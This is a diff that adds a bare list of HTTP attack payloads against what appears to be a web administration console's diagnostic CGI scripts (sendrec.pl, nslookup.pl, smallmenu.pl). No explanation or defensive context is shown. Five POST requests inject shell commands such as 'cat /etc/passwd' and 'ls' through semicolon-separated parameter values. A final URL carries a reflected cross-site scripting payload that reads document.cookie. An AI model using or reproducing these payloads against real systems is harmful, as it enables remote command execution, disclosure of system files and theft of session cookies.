@@ -1,0 +1,17 @@
+POST /cswebadm/diag/cgi-bin/sendrec.pl HTTP/1.1
+ipadd=127.0.0.1;cat+/etc/passwd&amp;count_p=1&amp;size_p=56
+
+POST https://www.example.com/cswebadm/diag/cgi-bin/sendrec.pl HTTP/1.1
+ipadd=;cat+/etc/passwd
+
+POST /cswebadm/diag/cgi-bin/sendrec.pl HTTP/1.1
+ipadd=&amp;count_p=1;ls&amp;size_p=56
+
+POST /cswebadm/diag/cgi-bin/sendrec.pl HTTP/1.1
+ipadd=&amp;count_p=1&amp;size_p=56&amp;opt_n=;ls
+
+POST /cswebadm/diag/cgi-bin/nslookup.pl HTTP/1.1
+host_or_ip=127.0.0.1&amp;r_type=;ls;
+
+https://www.example.com/cgi-bin/smallmenu.pl?url=%3C/
+title%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
